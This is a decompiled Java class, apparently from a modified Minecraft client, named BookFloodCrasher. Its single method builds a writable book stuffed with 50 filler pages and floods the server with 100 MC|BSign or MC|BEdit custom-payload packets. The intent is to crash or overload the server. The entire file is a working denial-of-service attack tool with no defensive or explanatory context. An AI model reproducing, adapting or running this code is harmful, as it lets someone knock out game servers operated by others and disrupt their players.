// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class BookFloodCrasher
{
    public static void start() {
        final ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagCompound bookCompound = new NBTTagCompound();
        bookCompound.setString("author", "aaa");
        bookCompound.setString("title", "asd");
        final NBTTagList pageList = new NBTTagList();
        final String pageText = "asdas1d2asda";
        for (int page = 0; page < 50; ++page) {
            pageList.appendTag(new NBTTagString("asdas1d2asda"));
        }
        bookCompound.setTag("pages", pageList);
        bookStack.setTagCompound(bookCompound);
        for (int packets = 0; packets < 100; ++packets) {
            final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.writeItemStackToBuffer(bookStack);
            Minecraft.getMinecraft().getConnection().sendPacket(new CPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
        }
    }
}
